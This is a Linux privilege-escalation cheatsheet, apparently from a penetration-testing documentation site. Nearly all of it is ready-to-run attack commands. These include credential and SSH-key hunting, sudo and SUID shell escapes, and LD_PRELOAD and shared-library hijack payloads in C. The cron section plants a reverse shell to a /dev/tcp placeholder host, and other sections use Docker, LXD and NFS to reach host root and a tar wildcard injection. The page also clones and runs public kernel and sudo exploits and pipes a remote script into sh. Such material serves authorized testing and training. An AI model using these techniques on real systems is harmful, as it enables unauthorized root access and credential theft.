---
title: "Linux PrivEsc"
description: "SUID, sudo, cron jobs, capabilities, and kernel exploits."
sidebar:
  order: 2
  label: "Linux PrivEsc"
---
> Techniques to escalate from a low-privilege user to root in Linux: enumeration, abusing SUID/capabilities/sudo, containers, kernel exploits, and library hijacking.

---


## Enumeration — System and Users

```bash
# Identity and groups
whoami; id; groups
sudo -l                                    # ← ALWAYS start here

# System
uname -a                                   # kernel + arch
cat /proc/version
cat /etc/os-release; cat /etc/lsb-release

# Processes and services
ps aux
ps aux | grep root                         # processes running as root

# Environment variables
env; set

# History and configuration files
history
cat ~/.bash_history
ls -la ~/
cat ~/.bashrc ~/.bash_profile ~/.profile

# Network
hostname -I; ip a; ifconfig
netstat -antp; ss -antp
cat /etc/hosts
```

---

## Credential Hunting

```bash
# Configuration files with credentials
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "wp-config.php" -o -name "config.php" 2>/dev/null
find / -name ".env" 2>/dev/null
cat /var/www/html/wp-config.php

# SSH keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
ls -la ~/.ssh/
cat ~/.ssh/id_rsa

# Potentially sensitive world-readable files
find / -not \( -path /proc -prune \) -not \( -path /sys -prune \) \
  -name "*.txt" -o -name "*.log" 2>/dev/null | xargs grep -i "password\|passwd\|secret" 2>/dev/null

# Databases
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# Command history of all users
find /home -name ".bash_history" 2>/dev/null | xargs cat 2>/dev/null
cat /root/.bash_history 2>/dev/null
```

---

## Sudo — Permission Abuse

```bash
sudo -l    # see what we can run as root

# GTFOBins — search for the binary at https://gtfobins.github.io/
# Examples:
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo vim -c ':!/bin/sh'
sudo less /etc/passwd    # then !/bin/sh

# LD_PRELOAD (if sudo -l shows env_keep+=LD_PRELOAD)
cat > /tmp/root.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart   # any sudo binary

# CVE-2021-3156 (sudo < 1.9.3 — Baron Samedit)
sudo -V | head -n1    # verify version
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156 && make
./sudo-hax-me-a-sandwich    # select target OS
./sudo-hax-me-a-sandwich 1  # 0=Ubuntu 18.04 / 1=Ubuntu 20.04 / 2=Debian 10

# CVE-2019-14287 (sudo < 1.8.28 — -u#-1 bypass)
sudo -u#-1 id    # → uid=0(root) — if the user can run sudo
```

---

## SUID / SGID

```bash
# Search for SUID binaries
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -perm -4000 2>/dev/null

# Search for SGID binaries
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# GTFOBins for the found binary
# Common examples:
/bin/bash -p           # if bash is SUID → shell as owner
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'  # if python is SUID
```

### Shared Object Hijacking (SUID + Writable RUNPATH)

```bash
# Identify non-standard library
ldd /path/to/suid_binary
readelf -d /path/to/suid_binary | grep PATH    # search for writable RUNPATH

# If /development (or another path) is writable:
# Create malicious library with the required function
./suid_binary    # → error: undefined symbol: dbquery
cat > /tmp/src.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
void dbquery() { setuid(0); system("/bin/sh -p"); }
EOF
gcc /tmp/src.c -fPIC -shared -o /development/libshared.so
./suid_binary    # → root shell
```

---

## Linux Capabilities

```bash
# Enumerate capabilities
find /usr/bin /usr/sbin /usr/local/bin -type f -exec getcap {} \; 2>/dev/null
# Or:
getcap -r / 2>/dev/null

# cap_setuid → direct setuid(0)
# Python with cap_setuid:
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_override → ignore read/write permissions
# vim with cap_dac_override to edit /etc/passwd:
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
su    # without root password

# cap_sys_admin → mount filesystems (see Docker/LXD)
```

---

## Cron Jobs

```bash
# View crontabs
cat /etc/crontab
ls -la /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.d/
crontab -l

# Monitor processes in real time with pspy
./pspy64 -pf -i 1000    # -pf: processes + FS events / -i 1000ms scan

# Search for world-writable files (potential cron script)
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# If the script is writable → append reverse shell
echo 'bash -i >& /dev/tcp/OUR_IP/443 0>&1' >> /dmz-backups/backup.sh
nc -lnvp 443    # wait for the cron job connection
```

---

## Docker / Containers

### Docker Group (User in docker Group)

```bash
id    # verify: groups=...,116(docker)

# Mount the host root at /mnt inside the container
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# → root shell with access to the entire host

# Via writable Docker socket
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

### Docker Socket inside a Container

```bash
ls -la /var/run/docker.sock    # if writable without being root

# Download docker binary if not present
wget https://parrot-os/docker -O /tmp/docker && chmod +x /tmp/docker

# List containers
/tmp/docker -H unix:///app/docker.sock ps

# Create a privileged container that mounts the host
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app

# Execute bash in the new container
/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
cat /hostsystem/root/.ssh/id_rsa    # SSH key of the host's root
```

---

## LXC / LXD Escalation

```bash
id    # groups=...,116(lxd) or 116(lxc)

# Import image (if ubuntu-template.tar.xz is on the system)
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list

# Create privileged container + mount host filesystem
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

# Start and obtain root shell
lxc start privesc
lxc exec privesc /bin/bash
ls /mnt/root    # host filesystem accessible as root
cat /mnt/root/root/.ssh/id_rsa
```

---

## NFS — no_root_squash

```bash
# From Pwnbox — view target exports
showmount -e TARGET_IP

# If /tmp or any share has no_root_squash:
cat /etc/exports    # search for no_root_squash

# From Pwnbox as root: create SUID binary and copy it to the NFS share
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void) { setuid(0); setgid(0); system("/bin/bash"); }
EOF
gcc /tmp/shell.c -o /tmp/shell
sudo mount -t nfs TARGET_IP:/tmp /mnt
cp /tmp/shell /mnt/
chmod u+s /mnt/shell

# On the target (as low-priv user)
/tmp/shell    # → bash as root (uid=0)
```

---

## Path Hijacking

```bash
# Check if . is in PATH
echo $PATH    # if it starts with .: → vulnerable

# Create malicious binary with the name of the searched command
export PATH=.:${PATH}
cat > ls << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x ls
# If any SUID script calls "ls" without an absolute path → root shell
```

---

## Wildcard Abuse (tar --checkpoint)

```bash
# In directory where cron runs: tar * or tar /path/to/dir/*
echo 'cp /bin/bash /tmp/rootbash; chmod 4777 /tmp/rootbash' > /tmp/root.sh
chmod +x /tmp/root.sh
cd /path/where/cron/runs/tar
echo "" > "--checkpoint-action=exec=sh /tmp/root.sh"
echo "" > --checkpoint=1
# Wait for cron execution → /tmp/rootbash -p → root
/tmp/rootbash -p
```

---

## Shared Library Hijacking

### LD_PRELOAD (via sudo with env_keep)

```bash
# Requires: sudo -l shows env_keep+=LD_PRELOAD and some sudo binary
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### Python Library Hijacking

```bash
# 1. Find SUID or sudo script that imports Python module
ls -l /path/script.py    # -rwsrwxr-x (SUID)
grep import script.py    # import psutil

# 2. Check module permissions
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
# If world-writable → edit and add: import os; os.system('id')

# 3. Hijacking via PYTHONPATH (if sudo SETENV: /usr/bin/python3)
# Create fake psutil.py in /tmp/
cat > /tmp/psutil.py << 'EOF'
import os
def virtual_memory():
    os.system('/bin/bash')
EOF
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py    # → root shell
```

---

## Special Groups

```bash
# disk group → direct access to block devices
df -h                        # identify disk
debugfs /dev/sda1            # open with debugfs
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow

# adm group → read system logs
cat /var/log/apache2/access.log    # credentials in logs
cat /var/log/auth.log
zcat /var/log/syslog.*.gz

# lxd/lxc group → see LXD section above
# docker group → see Docker section above
```

---

## tmux Session Hijacking

```bash
# Verify tmux sessions running as root
ps aux | grep tmux

# Verify socket permissions
ls -la /shareds    # srw-rw---- 1 root devs 0

# If we are in the devs group:
id    # groups=...,1011(devs)
tmux -S /shareds    # → attach to root session
```

---

## Screen 4.5.0 Exploit

```bash
screen -v    # Screen version 4.05.00 (GNU) 10-Dec-16
# Exploit requires compiling two .so in /tmp and writing to /etc/ld.so.preload via -L
# Script publicly available as screen_exploit.sh
./screen_exploit.sh    # → uid=0(root)
```

---

## Kernel Exploits / Known CVEs

```bash
# Identify version
uname -r
cat /etc/lsb-release

# Dirty Pipe (CVE-2022-0847) — kernels 5.8 to 5.17
# Allows writing to root files with only read access
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
./exploit-1    # modifies /etc/passwd → root password = "piped"
su             # password: piped → root

# exploit-2: requires existing SUID binary
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo    # → root shell

# PwnKit (CVE-2021-4034) — pkexec — practically universal
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc
./poc    # → root shell

# Netfilter CVE-2021-22555 (kernels 2.6-5.11)
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit && ./exploit

# Netfilter CVE-2022-25636 (kernels 5.4-5.6.10) — can crash kernel
git clone https://github.com/Bonfee/CVE-2022-25636.git && make && ./exploit

# Netfilter CVE-2023-32233 (kernel ≤ 6.3.1 — nf_tables UAF)
git clone https://github.com/Liuk3r/CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl && ./exploit

# Dirty COW (CVE-2016-5195) — very old kernels
# Search for PoC at https://github.com/dirtycow/dirtycow.github.io

# Generic Kernel
uname -r    # search Google: "linux <version> exploit"
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
./kernel_exploit
```

---

## Automated Enumeration Tools

```bash
# linPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or transfer and run:
./linpeas.sh | tee /tmp/linpeas.out

# pspy — monitor processes without root
./pspy64 -pf -i 1000

# LinEnum
./LinEnum.sh -t    # -t: thorough tests

# linux-exploit-suggester
./linux-exploit-suggester.sh

# Lynis (hardening audit)
./lynis audit system
```

---

## Quick Checklist (Order of Priority)

```
□ sudo -l           → direct binary in GTFOBins? LD_PRELOAD?
□ SUID binaries     → find / -perm -4000 → GTFOBins
□ Capabilities      → getcap -r / → cap_setuid in Python?
□ Cron (pspy64)     → writable script running as root?
□ Special groups    → docker / lxd / disk / adm
□ /etc/exports      → no_root_squash → SUID from Pwnbox
□ NFS shares        → showmount -e TARGET
□ Writable scripts  → find / -perm -o+w → PATH in SUID script
□ sudo CVEs         → sudo -V → 1.8.28? 1.9.3?
□ Kernel CVEs       → uname -r → Dirty Pipe? PwnKit? Netfilter?
□ Python/SO hijack  → sudo SETENV + python? RUNPATH writable?
□ Tmux sessions     → ps aux | grep tmux → socket writable?
□ Credentials       → .bash_history, configs, .env, .ssh
```

---

## Pitfalls / Gotchas

- **sudo -l sometimes requires a password** → it can be passed via pipe with `-S`, but if we don't have the password, try other techniques first.
- **GTFOBins does not always apply** → verify exact flags: `sudo find` vs `sudo find . -exec /bin/sh \; -quit` are very different.
- **LD_PRELOAD only works if `env_keep+=LD_PRELOAD` appears in sudo -l** → if it is in `env_reset` without exception, it won't work.
- **SUID in Bash scripts** → Linux ignores the SUID bit on interpreted scripts (bash, python). Only applies to compiled binaries.
- **getcap needs full path** → `getcap -r /` scans everything but can take a while. Limit to `/usr/bin /usr/sbin /usr/local/bin`.
- **pspy needs execution permissions** → `chmod +x pspy64` before running; transfer it if it's not on the target.
- **NFS no_root_squash** → you need to be root on the Pwnbox to create the SUID binary and mount it. Without root access on Pwnbox, it does not work.
- **Kernel exploits can crash the system** → Netfilter CVEs are especially unstable. Warn the client; do not use in production without authorization.
- **Dirty Pipe requires read access to the file** → it requires read permission (r) on the file to be modified (e.g., `/etc/passwd`).
- **PwnKit (CVE-2021-4034) is almost universal** → it affects pkexec since 2009. Attempt it if other techniques fail.
- **Writable Docker socket** → `ls -la /var/run/docker.sock` and verify that the group is writable by our user.
- **LXD without a local image** → search for `.tar.xz` on the system with `find / -name "*.tar.xz" 2>/dev/null`. If none are found, transfer Alpine from Pwnbox.
- **Shared object hijacking**: the library filename must exactly match the one searched for by the binary, as must the exported function.
- **Python library path**: `python3 -c 'import sys; print("\n".join(sys.path))'` shows the search order. The writable directory must be BEFORE the real module directory.

---

## Related Cheatsheets

- [Windows Privilege Escalation](/en/metodologias/privesc/windows-privilege-escalation/) — equivalent techniques for Windows
- [Active Directory Enumeration & Attacks](/en/metodologias/active-directory/active-directory-enumeration-attacks/) — after local root, pivot to AD
- [File Transfers](/en/metodologias/privesc/file-transfers/) — transfer linPEAS, pspy, and exploits to the target
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells for cron jobs and exploits
- [Pivoting, Tunneling, and Port Forwarding](/en/metodologias/pivoting/pivoting-tunneling-port-forwarding/) — post-exploitation after privesc
